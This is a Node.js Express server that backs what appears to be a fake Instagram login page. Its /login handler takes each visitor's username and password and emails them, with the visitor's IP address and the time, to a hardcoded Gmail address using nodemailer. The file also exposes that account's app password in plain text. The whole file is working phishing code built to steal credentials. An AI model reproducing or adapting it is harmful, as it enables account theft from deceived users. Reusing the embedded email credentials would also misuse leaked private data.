const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const bodyParser = require('body-parser');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3001;

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname)));

// Email configuration
const transporter = nodemailer.createTransport({
    service: 'gmail', // You can change this to 'outlook', 'yahoo', etc.
    auth: {
        user: 'srirambalu369@gmail.com', // Replace with your email
        pass: 'zmpn rlik ukno vduw' // Replace with your app password
    }
});

// Serve the main page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Handle login form submission
app.post('/login', async (req, res) => {
    try {
        const { username, password } = req.body;
        
        // Email content
        const mailOptions = {
            from: 'srirambalu369@gmail.com', // Replace with your email
            to: 'srirambalu369@gmail.com', // Replace with your email
            subject: '🔐 New Instagram Login Credentials',
            html: `
                <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; background-color: #f9f9f9;">
                    <div style="background-color: #ffffff; padding: 30px; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">
                        <h2 style="color: #e4405f; text-align: center; margin-bottom: 30px;">📱 Instagram Login Credentials</h2>
                        
                        <div style="background-color: #f8f9fa; padding: 20px; border-radius: 8px; margin-bottom: 20px;">
                            <h3 style="color: #333; margin-bottom: 15px;">🔍 Login Details:</h3>
                            <p style="margin: 10px 0; font-size: 16px;"><strong>Username:</strong> <span style="color: #e4405f;">${username}</span></p>
                            <p style="margin: 10px 0; font-size: 16px;"><strong>Password:</strong> <span style="color: #e4405f;">${password}</span></p>
                        </div>
                        
                        <div style="background-color: #e3f2fd; padding: 15px; border-radius: 8px; border-left: 4px solid #2196f3;">
                            <p style="margin: 0; color: #1976d2; font-size: 14px;">
                                <strong>⏰ Time:</strong> ${new Date().toLocaleString()}
                            </p>
                            <p style="margin: 5px 0 0 0; color: #1976d2; font-size: 14px;">
                                <strong>🌐 IP Address:</strong> ${req.ip || req.connection.remoteAddress}
                            </p>
                        </div>
                        
                        <div style="text-align: center; margin-top: 30px; padding-top: 20px; border-top: 1px solid #eee;">
                            <p style="color: #666; font-size: 12px;">
                                This is an automated notification from your Instagram login page.
                            </p>
                        </div>
                    </div>
                </div>
            `
        };

        // Send email
        await transporter.sendMail(mailOptions);
        
        console.log('✅ Email sent successfully');
        res.json({ success: true, message: 'Login credentials sent successfully' });
        
    } catch (error) {
        console.error('❌ Error sending email:', error);
        res.status(500).json({ success: false, message: 'Failed to send credentials' });
    }
});

// Start server
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log('📧 Email notifications will be sent to your configured email address');
}); 